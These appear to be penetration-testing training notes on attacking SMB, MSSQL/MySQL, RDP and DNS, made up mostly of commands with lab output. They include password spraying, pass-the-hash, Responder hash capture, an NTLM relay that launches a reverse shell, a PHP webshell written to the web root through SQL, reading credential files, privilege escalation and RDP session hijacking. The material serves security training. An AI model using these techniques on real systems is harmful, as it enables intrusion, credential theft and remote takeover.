---
title: Attacking common services
description: My notes on HTTP verb tamperting
---

# Attacking SMB
`smbmap` offers more than `smbclient`, it allows upload and download operations and when listing the share available on the system it shows what permissions  you have for each share ;
```shell
smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```
We can use `smbmap` with the `-r` option to list content under a specific share ;
```shell
smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
```
if we have `READ, WRITE` permissions, we can upload/download a file to/from the share ;
```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

```shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```
## Password Spray
Password spray is when you have a valid password and you try it on many users, this is a great alternative to brute-force attacks, because in these we may get blocked after a number of times. We can use `nxc` to start a password spraying attack against an SMB server ; 
```
nxc smb <IP> -u <USER_LIST> -p <PASSWORD>
```

>By default `nxc` will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`.
{: .prompt-info}

## Remote Command Execution
[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system. There are many tools we can use to abuse PsExec ;
- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.
#### Impacket PsExec
The syntax of the command is ;
```shell
psexec.py <USERNAME/DOMAIN>:'<PASSWORD'@<IP>
```
The same options apply to `impacket-smbexec` and `impacket-atexec`.
#### CrackMapExec
This huge tool also supports command execution via `atexec` and `smbexec` methods. The syntax is simple ;
```shell
nxc smb -u <USER> -p <PASS> -x whoami --exec-method <METHOD>
```

>The `-x` executes a `cmd.exe` command and the `-X` executes a `powershell.exe` command. Another thing is when you don't specify a method, `nxc` will try `atexec`, you should manually try `smbexec`
{: .prompt-info}

#### Enumerating Logged-on Users
If we are in a network, multiple devices may share the same administrator credentials, we can then enumerate logged-on users on all of them ;
```shell
nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```
#### Extract Hashes from SAM Database
We can also use `nxc` to extract hashes from the SAM database, this is useful because we can carry out more attacks from here, like pass the hash or password spraying if we managed to crack a hash ;
```shell
nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
...
```
#### Pass-the-Hash (PtH)
If we got an NTLM hash from a SAM database, we can do a PtH attack, it simply means that we can provide the hash instead of the password ;
```shell
crackmapexec smb 10.10.110.1/24 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```
#### Forced Authentication Attacks
We can also create a fake SMB server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4). The most common tool for this purpose is [Responder](https://github.com/lgandx/Responder), In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes. When ever the system tries to do name resolution, it goes through a couple of steps and one of them is sending a multicast query to all devices on the network requesting the IP address corresponding to that name. If a user mistyped a share name `\\content\` instead of `\\contents\`, the name resolution will fail on all checks which leads to the last check which is issuing a multicast query to network devices, including our malicious SMB server run by `responder` which listings for these queries and spoofes responses and impersonates the requested server, in turn giving us the credentials (hashes) ;
```shell-session
sudo responder -I ens33

[+] Listening for events... 
...
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC4629
```
>All saved hashes are in the `/usr/share/responder/logs/` directory and we can crack them using mode 5600 in hashcat
{: .prompt-info}


If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`. First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`). Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.
```shell-session
vu1ner@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

dministrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```
We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'REVERSE_SHELL'
```
after that we will listen on our server for any connections using socat ;
```shell
socat file:`tty`,raw,echo=0 tcp-listen:9999
```
If the server authenticates to our server it will execute the command and we'll get a revshell.
# Attacking Databases
### MSSQL
We can connect to mssql via `mssqlclient.py` by impacket ;
```shell
 mssqlclient.py -p 1433 julio@10.129.203.7 

Password: MyPassword!

SQL> 
```
another tool is `sqsh`, to authenticate to the server ;
```shell
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

1>
```
entering the username like that tells `sqsh` that we are authenticating to an SQL account, if we want to authenticate using Windows authentication we can prepend the username with `DOMAINNAME\\` or `.\\` like ;
```shell
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

1>
```

>If you have credentials and you can't login try windows authentication
{: .prompt-info}

### SQL Default Databases
`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.
### SQL Syntax

#### Show Databases
```shell
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```
If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax ;
```cmd
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```
#### Select a Database
```shell
mysql> USE htbusers;

Database changed
```

```cmd
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```
#### Show Tables
```shell
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
...
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

```cmd
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
....
(8 rows affected)
```
#### View users - MSSQL
```shell
SELECT name, type_desc FROM sys.database_principals
```
```shell
SELECT name, type_desc FROM master.sys.server_principals
```
#### Select all Data from Table "users"
```shell
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

```cmd
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```
## Execute Commands - MSSQL
`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed
#### XP_CMDSHELL
```cmd
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
## Write Local Files
#### MySQL - Write Local File
```shell
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```
Please refer to [SQL injection](obsidian://open?vault=Offensive&file=Web%2FSQL%20injection) paper for more information about the required privileges and how to check them
#### MSSQL - Write Local File
To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### MSSQL - Enable Ole Automation Procedures

```cmd
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File

```cmd
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
## Read Local Files

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

#### Read Local Files in MSSQL

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO


# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
```

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

#### MySQL - Read Local Files in MySQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

root:x:0:0:root:/root:/bin/bash
```
## Capture MSSQL Service Hash
In the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:

#### XP_DIRTREE Hash Stealing

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

#### XP_SUBDIRS Hash Stealing

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

#### XP_SUBDIRS Hash Stealing with Responder

```shell
sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c43...
```
>Try different interfaces and kill the service running on port 53 (dnsmasq)
{: .prompt-info}

#### XP_SUBDIRS Hash Stealing with impacket

```shell
sudo impacket-smbserver share ./ -smb2support

[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D5...
```
>All saved hashes are in the `/usr/share/responder/logs/` directory and we can crack them using mode 5600 in hashcat
{: .prompt-info}

## Impersonate Existing Users with MSSQL
SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.

First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:

#### Identify Users that We Can Impersonate

```cmd
1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

#### Verifying our Current User and Role

```cmd
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

#### Impersonating the SA User

```cmd
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

>It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.
{: .prompt-info}


We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

>If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.
{: .prompt-info}

## Communicate with Other Databases with MSSQL
`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

#### Identify linked Servers in MSSQL

```cmd
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

```cmd
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

> If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
{: .prompt-info}
As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance.
# Attacking RDP
On port `3389` RDP is used for remote control over a windows device with a GUI interface, unlike winrm.
#### RDP Session Hijacking
Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain. We are logged in as the user `juurena` with Administrator privileges and we want to hijack the session for the user `lewen`;

To impersonate a user, we need to have SYSTEM privileges and have use the `tscon.exe` binary in windows. We have to key information in the above image, `SESSIONNAME` and `ID`, we can use the following command to impersonate a user ;
```cmd
C:> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.
```cmd-session
C:> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:<OUR_SESSION_NAME>"
```
To run the command, we can start the `sessionhijack` service :
```cmd-session
C:> net start sessionhijack
```
After that, a new terminal with the user lewen will appear. We can enumerate further


>This method no longer works on Server 2019.
{: .prompt-info}

# Attacking DNS
refer to [Host based enumeratio](obsidian://open?vault=Offensive&file=CPTS%2FFootprinting%2FHost%20Based%20Enumeration) paper for more information.
#### Subbrute
 [Subbrute](https://github.com/TheRook/subbrute) allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.
 ```shell
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com

<SNIP>
```